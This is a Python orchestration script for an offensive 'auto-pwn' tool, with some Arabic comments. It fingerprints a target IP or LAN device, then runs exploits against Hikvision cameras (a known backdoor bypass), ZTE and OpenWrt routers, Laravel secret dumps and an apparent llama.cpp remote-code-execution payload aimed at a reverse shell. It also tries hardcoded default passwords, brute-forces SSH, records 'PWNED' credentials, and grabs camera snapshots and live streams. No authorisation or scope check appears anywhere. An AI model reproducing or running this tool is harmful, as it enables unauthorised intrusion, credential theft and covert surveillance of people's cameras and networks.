import sys
import os

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

import webbrowser
import subprocess
from engines.utils import log, extract_ip, extract_credentials, clear_logs, save_success, get_target_data, input_with_timeout
from engines.scanner import Scanner
from engines.laravel_module import LaravelExploiter
from engines.hikvision_module import HikvisionExploiter
from engines.ssh_engine import SSHEngine
from engines.fuzzer_module import Fuzzer
from engines.zte_module import ZTEExploiter
from engines.llama_cpp_module import LlamaCppExploiter
from engines.browser_automation import BrowserAutomation
from engines.external_tools import ExternalTools
from engines.camera_viewer import CameraViewer
from engines.fingerprinter import Fingerprinter
from engines.loot_report import LootReport, LootEntry
from engines.credential_hunter import (
    hunt_hikvision_credentials,
    hunt_web_router_credentials,
    parse_ingram_results,
)
from engines.hikvision_snapshots import DEFAULT_PASSWORD
from engines.device_cve_checker import (
    assess_device,
    print_cve_report,
    probe_hikvision_backdoor,
)

CAMERA_DEVICE_TYPES = ("HIKVISION", "DAHUA", "GENERIC_DVR")
ROUTER_DEVICE_TYPES = (
    "NETIS", "TPLINK", "DLINK", "ZTE", "MIKROTIK", "OPENWRT", "CISCO", "UBIQUITI", "SYNOLOGY",
)

def main(target_input, manual_mode=False):
    ip = extract_ip(target_input)
    if not ip:
        log("Invalid IP/URL provided.", "ERROR")
        return

    # 0. الذاكرة: التحقق من البيانات السابقة وتجربتها
    old_data = get_target_data(ip)
    if old_data["status"] == "PWNED":
        print("\n" + "!"*50)
        log(f"WARNING: TARGET {ip} PREVIOUSLY PWNED!", "SUCCESS")
        for svc in old_data["pwned_services"]:
            print(f"   [>] Found {svc['service']}: {svc['creds']}")
        print("!"*50 + "\n")
        
        choice = input("[?] Try existing credentials to log in? (y/n): ").strip().lower()
        if choice == 'y':
            log("Attempting validation with stored credentials...", "INFO")
            # استخراج كلمات المرور من البيانات القديمة
            stored_passwords = []
            for svc in old_data["pwned_services"]:
                creds = svc['creds']
                if "Password: " in creds:
                    stored_passwords.append(creds.split("Password: ")[-1])
            
            automation = BrowserAutomation()
            found_working = False
            for pw in stored_passwords:
                res = automation.auto_login_openwrt(f"http://{ip}", pw)
                if res == True:
                    log(f"STILL PWNED! Password '{pw}' still works. Access granted.", "SUCCESS")
                    found_working = True
                    break
                elif res == "RATE_LIMITED":
                    log("Aborting further credential tests due to rate limiting.", "ERROR")
                    break # نخرج من حلقة الباسوردات فوراً
            
            if found_working:
                return 
            else:
                log("Credential validation failed or was blocked.", "ERROR")
                choice = input("\n[?] Stored credentials failed/locked. Proceed to full attack phase? (y/n): ").strip().lower()
                if choice != 'y':
                    log("Exiting. No changes made.", "INFO")
                    return
                log("Starting full attack phase to recover the NEW password...", "WARNING")
        else:
            log("Skipping validation. Starting rescan...", "INFO")

    # اكتشاف المنافذ تلقائياً
    scanner = Scanner()
    open_ports = scanner.discover_ports(ip)
    loot = LootReport(ip)
    loot.open_ports = list(open_ports)
    
    # قوائم تجميع البيانات من كل البورتات
    all_passwords = ["QwEzxc321!@#", "Asdasd12", "12345", DEFAULT_PASSWORD]
    all_users = ["admin", "root", "dbadmin", "ubuntu"]

    # إضافة بيانات الرابط إذا وجدت
    u_url, p_url = extract_credentials(target_input)
    if u_url: all_users.insert(0, u_url)
    if p_url: all_passwords.insert(0, p_url)

    if not open_ports:
        log(f"No common web ports found open on {ip}. Trying default port 80.", "INFO")
        open_ports = [80]
    elif 80 not in open_ports:
        # جرّب 80 دائماً للكاميرات/NVR حتى لو لم يظهر في الفحص السريع
        open_ports.insert(0, 80)

    for port in open_ports:
        target_url = f"http://{ip}:{port}"
        if port == 443: target_url = f"https://{ip}:{port}"
        
        log(f"\n>>> STARTING ATTACK ON PORT: {port} ({target_url}) <<<", "SUCCESS")
        
        # 1. Quick Fingerprinting
        fprinter = Fingerprinter(target_url)
        fp_info = fprinter.identify_details()
        device_type = fp_info["device_type"]
        device_model = fp_info.get("model", "")
        log(f"Detected Device Type: {device_type}", "INFO")
        if device_model:
            log(f"Device Model/Title: {device_model}", "INFO")

        if device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port):
            device_type = "HIKVISION"
            log("Deep probe: Hikvision backdoor open — CAMERA path.", "INFO")

        is_camera = device_type in CAMERA_DEVICE_TYPES
        is_router = device_type in ROUTER_DEVICE_TYPES
        if is_camera:
            log("Target classified as CAMERA/DVR — camera exploit path.", "INFO")
        elif is_router:
            log("Target classified as ROUTER — router credential path.", "INFO")
        elif device_type == "UNKNOWN":
            log("Device type unknown — camera CVE probes + router creds.", "WARNING")

        # --- CVE Intelligence (cameras + routers) ---
        cve_auth = None
        best_early = loot.best_entry()
        if best_early and best_early.has_credentials:
            cve_auth = (best_early.username, best_early.password)
        device_intel = assess_device(
            ip, port, device_type, device_model, fp_info.get("server", ""), auth=cve_auth,
        )
        if device_intel.model and not device_model:
            device_model = device_intel.model
        if device_intel.device_type == "HIKVISION" and device_type == "UNKNOWN":
            device_type = "HIKVISION"
            is_camera = True
        print_cve_report(device_intel)
        for assessment in device_intel.assessments:
            if assessment.status in ("CONFIRMED", "LIKELY_VULNERABLE"):
                loot.add_note(f"{assessment.cve_id}: {assessment.status} — {assessment.reason}")

        ext_tools = ExternalTools(ip)
        auto_browser = BrowserAutomation()
        router_pwned = False
        camera_handled = False

        # Fast Router Scan style cred hunt (routers only — not cameras)
        if (
            not manual_mode
            and not is_camera
            and (is_router or device_type == "UNKNOWN")
        ):
            router_entry = hunt_web_router_credentials(ip, port, device_type)
            if router_entry:
                if router_entry.device_type == "NETIS" or "netis" in (router_entry.model or "").lower():
                    device_type = "NETIS"
                router_entry.model = router_entry.model or device_model
                device_model = router_entry.model or device_model
                loot.add(router_entry)
                save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
                if router_entry.password not in all_passwords:
                    all_passwords.insert(0, router_entry.password)
                if router_entry.username not in all_users:
                    all_users.insert(0, router_entry.username)
                router_pwned = True
                log(
                    f"Router credentials found: {router_entry.username}:{router_entry.password}",
                    "PWN",
                )

        if manual_mode:
            print("\n" + "-"*45)
            print(f"  EXPERT MANUAL MENU for {ip}:{port}")
            print("-" * 45)
            print("  [1] Nuclei Scan      (Web Vulnerabilities)")
            print("  [2] RouterSploit     (Exploit Routers)")
            print("  [3] Ingram           (Scan Cameras/DVRs)")
            print("  [4] Web Brute-force  (Try LuCI/OpenWrt login)")
            print("  [5] Laravel Exploit  (Dump .env secrets)")
            print("  [6] Skip this port   (Go to next port)")
            print("  [0] Auto-Pwn         (Run everything automatically)")
            # --- PHASE 4: DEEP SCAN (ROUTERSPLOIT & INGRAM) ---
            log("Phase 4: Deep Scan", "INFO")
            print("  [1] RouterSploit (Exploits)  [2] Ingram (Cameras)  [0] Skip")
            deep_choice = input("[?] Choose: ").strip()
            if deep_choice == '1':
                vulns = ext_tools.run_routersploit_scan()
                if vulns:
                    log(f"Detected {len(vulns)} potential vulnerabilities!", "WARNING")
                    for v in vulns:
                        confirm = input(f"[?] Exploit {v} now? (y/n): ").strip().lower()
                        if confirm == 'y':
                            ext_tools.run_routersploit_exploit(v)
            elif deep_choice == '2':
                ext_tools.run_ingram_scan()
            print("-" * 45)
            
            choice = input("[?] Choose Tool ID to run: ").strip()
            
            if choice == '1': scanner.scan(target_url)
            elif choice == '2': 
                vulns = ext_tools.run_routersploit_scan()
                if vulns:
                    for v in vulns:
                        conf = input(f"[?] Exploit {v} now? (y/n): ").strip().lower()
                        if conf == 'y': ext_tools.run_routersploit_exploit(v)
            elif choice == '3': ext_tools.run_ingram_scan()
            elif choice == '4':
                automation = BrowserAutomation(ip, port)
                automation.auto_login_openwrt(all_passwords)
            elif choice == '5':
                fuzzer = Fuzzer(ip, port)
                fuzzer.scan_env()
            elif choice == '6': continue
            elif choice == '0': is_manual = False
            
            if choice != '0':
                log(f"Manual task finished on port {port}.", "SUCCESS")
                continue # Skip the rest of the automated flow for this port

        # 2. Specialized Exploitation
        is_laravel = device_type == "LARAVEL"
        is_hikvision = device_type == "HIKVISION"
        is_zte = device_type == "ZTE"
        is_dahua = device_type == "DAHUA"
        is_llama = device_type == "LLAMA_CPP"

        is_openwrt = device_type == "OPENWRT"
        is_netis = device_type == "NETIS"

        # محاولة الاستغلال السريع قبل الفحص الطويل
        if is_laravel or is_hikvision or is_zte or is_dahua or is_openwrt or is_netis or is_llama:
            log(f"High-Value Target Detected ({device_type}). Running specialized exploiters FIRST...", "PWN")
            
            if is_llama:
                llama_exp = LlamaCppExploiter(ip, port)
                if llama_exp.run_exploit():
                    loot.add_note(f"CVE-2026-34159: Potential llama.cpp RCE exploit sent on port {port}. Check reverse shell listener.")
                    save_success(ip, f"llama.cpp ({port})", "CVE-2026-34159 RCE payload delivered")
            
            if is_laravel:
                lex = LaravelExploiter(target_url)
                if lex.dump_env():
                    all_passwords.extend(lex.passwords)
            
            if is_hikvision:
                camera_handled = True
                hexp = HikvisionExploiter(target_url)
                hik_users, hik_passwords = hexp.run_backdoor()
                all_users.extend(hik_users)
                for pw in reversed(hik_passwords):
                    if pw not in all_passwords:
                        all_passwords.insert(0, pw)
                for cred in ext_tools.search_default_creds("hikvision"):
                    if cred["pass"] not in all_passwords:
                        all_passwords.append(cred["pass"])

                t_dir = f"targets/{ip}"
                loot.add_file(f"{t_dir}/configurationFile")
                loot.add_file(f"{t_dir}/live_snapshot.jpg")

                cred_entry = hunt_hikvision_credentials(ip, hik_users, all_passwords, port)
                if cred_entry:
                    cred_entry.model = cred_entry.model or device_model
                    loot.add(cred_entry)
                    save_success(ip, f"Hikvision ({port})", f"{cred_entry.username}:{cred_entry.password}")
                else:
                    loot.add(
                        LootEntry(
                            ip=ip,
                            port=port,
                            device_type="HIKVISION",
                            model=device_model,
                            username=hik_users[0] if hik_users else "admin",
                            password="(see backdoor access below)",
                            auth_method="CVE-2017-7921 bypass only — real password not cracked yet",
                            extra={"backdoor_login": "admin:11 (NOT real password — exploit bypass)"},
                        )
                    )
                    loot.add_note(
                        "Backdoor admin:11 opens snapshots/config WITHOUT real password. "
                        "Router Scan finds real password (e.g. admin:12345678eh) via config decrypt + Digest auth."
                    )

                use_backdoor = not cred_entry and getattr(hexp, "backdoor_active", False)
                if cred_entry:
                    device_intel = assess_device(
                        ip, port, "HIKVISION", device_model,
                        auth=(cred_entry.username, cred_entry.password),
                    )
                    print_cve_report(device_intel)
                cam_user = cred_entry.username if cred_entry else (hik_users[0] if hik_users else "admin")
                cam_pass = cred_entry.password if cred_entry else (hik_passwords[0] if hik_passwords else "11")
                cam = CameraViewer(ip, cam_user, cam_pass, use_backdoor_auth=use_backdoor)
                cam.discover_channels()
                snap_paths = cam.take_snapshots()
                for p in snap_paths:
                    loot.add_file(p)
                cam.open_in_vlc(use_sub_stream=True)

            if is_zte:
                zte = ZTEExploiter(target_url)
                zte.run_exploit()
                ext_tools.run_routersploit_scan()

            if is_openwrt:
                log("OpenWrt/LuCI Device Detected! Running automated login attempts...", "SUCCESS")
                for pw in all_passwords:
                    if auto_browser.auto_login_openwrt(target_url, pw):
                        entry = LootEntry(
                            ip=ip, port=port, device_type="OPENWRT",
                            model=device_model, username="admin", password=pw,
                            auth_method="LuCI web login",
                        )
                        loot.add(entry)
                        save_success(ip, "OpenWrt Web", f"admin:{pw}")
                        router_pwned = True
                        break
                ext_tools.run_routersploit_scan()

            if is_netis and router_pwned:
                log("Netis router pwned — skipping slow deep scan.", "SUCCESS")
            elif is_netis and not router_pwned:
                router_entry = hunt_web_router_credentials(ip, port, device_type)
                if router_entry:
                    router_entry.model = router_entry.model or device_model
                    loot.add(router_entry)
                    save_success(ip, f"Netis ({port})", f"{router_entry.username}:{router_entry.password}")
                    router_pwned = True

            if is_dahua:
                camera_handled = True
                cam = CameraViewer(ip, all_users[0], all_passwords[0])
                cam.discover_channels()
                cam.take_snapshots()
                cam.open_in_vlc(use_sub_stream=True)
            
        # --- DEEP SCAN: cameras → Ingram | routers → RouterSploit ---
        run_rsf = (
            not router_pwned
            and not is_camera
            and (is_router or device_type == "UNKNOWN")
        )
        run_ingram = (
            not camera_handled
            and (
                is_camera
                or device_type == "UNKNOWN"
                or port in (554, 8000, 8080, 37777)
            )
        )

        if run_rsf or run_ingram or manual_mode:
            log(f"Running Targeted Deep Scan for {device_type}...", "INFO")

            if run_rsf or manual_mode:
                discovered_vulns = ext_tools.run_routersploit_scan()
                if discovered_vulns:
                    log(f"!!! {len(discovered_vulns)} VULNERABILITIES DETECTED !!!", "WARNING")
                    for vuln in discovered_vulns:
                        ext_tools.run_routersploit_exploit(vuln)

            if run_ingram or (manual_mode and port in (554, 8000, 8080, 37777)):
                ext_tools.run_ingram_scan()
                for ingram_entry in parse_ingram_results(ip):
                    loot.add(ingram_entry)
                    save_success(ip, "Ingram", f"{ingram_entry.username}:{ingram_entry.password}")
                    camera_handled = True

        # Fallback router cred hunt
        if (
            not manual_mode
            and not router_pwned
            and not is_camera
            and (is_router or device_type == "UNKNOWN")
        ):
            router_entry = hunt_web_router_credentials(ip, port, device_type)
            if router_entry:
                router_entry.model = router_entry.model or device_model
                loot.add(router_entry)
                save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
                router_pwned = True

        # --- CVE-targeted Nuclei (always in auto mode) ---
        if not manual_mode and device_intel.assessments:
            log("Phase: CVE-targeted Nuclei scan...", "INFO")
            cve_findings = scanner.scan_cve_intel(target_url, device_intel)
            for f in cve_findings:
                tid = f.get("template-id", "unknown") if isinstance(f, dict) else str(f)
                loot.add_note(f"Nuclei CVE hit: {tid}")

        # Skip full Nuclei when device identified and creds/exploit succeeded
        skip_full_nuclei = (
            not manual_mode
            and (device_type != "UNKNOWN" or router_pwned or camera_handled)
        )
        if skip_full_nuclei:
            log(f"--- ATTACK ON PORT {port} COMPLETED (Auto — skipping full Nuclei) ---", "SUCCESS")
            continue

        if device_type != "UNKNOWN" and manual_mode:
            choice = input_with_timeout("[?] Run full Nuclei scan anyway?", timeout=10, default='n')
            if choice != 'y':
                log(f"--- ATTACK ON PORT {port} COMPLETED ---", "SUCCESS")
                continue

        # 3. Full Nuclei scan (unknown devices / manual request)
        findings = scanner.scan(target_url)
        log(f"--- ATTACK ON PORT {port} COMPLETED ---", "SUCCESS")
    
    rtsp_ports = scanner.discover_rtsp_ports(ip)
    if rtsp_ports:
        log(f"RTSP port(s) open: {rtsp_ports}. Trying camera streams...", "INFO")
        use_backdoor = "11" in all_passwords and not any(e.has_credentials for e in loot.entries)
        best = loot.best_entry()
        cam_user = best.username if best else all_users[0]
        cam_pass = best.password if best else all_passwords[0]
        cam = CameraViewer(ip, cam_user, cam_pass, use_backdoor_auth=use_backdoor)
        cam.discover_channels()
        snap_paths = cam.take_snapshots()
        for p in snap_paths:
            loot.add_file(p)
        cam.open_in_vlc(use_sub_stream=True)

    # === FINAL SSH PIVOT ===
    ssh_ports = scanner.discover_ssh_ports(ip)
    if ssh_ports:
        log("SSH Phase: Trying all discovered credentials across all ports...", "PWN")
        all_users = list(set(all_users))
        all_passwords = list(set(all_passwords))
        
        for sp in ssh_ports:
            ssh_engine = SSHEngine(ip, port=sp)
            if ssh_engine.brute_force(all_users, all_passwords):
                loot.add(LootEntry(
                    ip=ip, port=sp, device_type="SSH",
                    username=all_users[0], password="(discovered)",
                    auth_method="SSH brute-force",
                ))
                save_success(ip, f"SSH ({sp})", "Discovered Creds")
                break
        else:
            log("Phase 1 failed. Default DB option available.", "INFO")
            # (هنا يمكن إضافة خيار قاعدة البيانات الكبيرة إذا أراد المستخدم)

    env_file = f"targets/{ip}/env_backup.txt"
    if os.path.exists(env_file):
        loot.add_file(env_file)
        loot.add_note("Laravel .env secrets dumped")

    loot.print_final()
    log("--- ALL TASKS COMPLETED ---", "SUCCESS")
    if open_ports and not manual_mode:
        try:
            webbrowser.open(f"http://{ip}:{open_ports[0]}")
        except Exception:
            pass

if __name__ == "__main__":
    from engines.lan_scanner import LANScanner
    from engines.utils import extract_ip
    from engines.updater import run_startup_update
    
    if os.environ.get("NUCLEI_SKIP_UPDATE") != "1":
        run_startup_update()
    clear_logs()
    print("\n==================================================")
    print("      NUCLEI AUTO-PWN SYSTEM - GEMINI EDITION")
    print("==================================================\n")
    
    while True:
        print("  [1] Enter Target URL manually")
        print("  [2] Scan Local Network (LAN) to find targets")
        start_choice = input("\n[?] Select option: ").strip()
        
        target = ""
        if start_choice == '1':
            target = input("[?] Enter Target URL: ").strip()
            if target: break
        elif start_choice == '2':
            scanner = LANScanner()
            devices = scanner.run_scan()
            if devices:
                print("\n" + "="*60)
                print("      SELECT DEVICE TO START AUTO-PWN")
                print("="*60)
                for i, dev in enumerate(devices):
                    print(f"  [{i+1}] IP: {dev['ip']:<15} | Type: {dev['type']:<15}")
                print("="*60)
                
                while True:
                    idx = input("\n[?] Select Device ID (or 'b' to go back): ").strip()
                    if idx.lower() == 'b': break
                    try:
                        target = "http://" + devices[int(idx)-1]['ip']
                        break
                    except:
                        log("Invalid ID. Please try again.", "ERROR")
                if target: break
            else:
                log("No devices found on LAN. Try manual entry.", "ERROR")
        else:
            log("Invalid option. Please choose 1 or 2.", "ERROR")
    
    if target:
        while True:
            print("\n[M] Select Execution Mode:")
            print("    [1] FULL AUTO-PWN (Everything automatically)")
            print("    [2] EXPERT MANUAL (Choose tools manually)")
            mode = input("\n[?] Select mode [1/2]: ").strip()
            
            if mode in ['1', '2']:
                is_manual = (mode == '2')
                break
            else:
                log("Invalid mode. Please choose 1 or 2.", "ERROR")
        
        if not target.startswith("http"): target = "http://" + target
        main(target, manual_mode=is_manual)
